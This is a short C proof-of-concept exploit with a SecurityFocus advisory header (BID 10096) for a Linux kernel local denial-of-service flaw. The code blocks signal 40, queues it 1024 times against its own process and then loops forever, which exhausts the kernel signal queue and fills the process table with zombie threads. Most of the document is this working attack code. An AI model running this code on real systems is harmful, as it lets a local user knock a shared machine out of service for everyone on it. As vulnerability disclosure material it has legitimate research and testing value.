/*
source: http://www.securityfocus.com/bid/10096/info

A vulnerability has been reported in the Linux Kernel that may permit a malicious local user to affect a system-wide denial of service condition. This issue may be triggered via the Kernel signal queue (struct sigqueue) and may be exploited to exhaust the system process table by causing an excessive number of threads to be left in a zombie state.
*/


#include <signal.h>
#include <unistd.h>
#include <stdlib.h>
 
int main()
{
	sigset_t set;
	int i;
	pid_t pid;

	sigemptyset(&set);
	sigaddset(&set, 40);
	sigprocmask(SIG_BLOCK, &set, 0);

	pid = getpid();
	for (i = 0; i < 1024; i++)
		kill(pid, 40);

	while (1)
		sleep(1);
}
 